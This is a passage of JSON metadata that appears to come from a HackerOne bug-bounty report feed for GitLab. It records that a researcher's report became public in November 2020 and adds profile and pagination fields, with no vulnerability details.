ull},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9901039,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-23T16:05:04.564Z","updated_at":"2020-11-23T16:05:04.564Z","actor":{"username":"yvvdwf","cleared":false,"url":"/yvvdwf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yQ79x7V8gqtK3SUH9zj881MY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}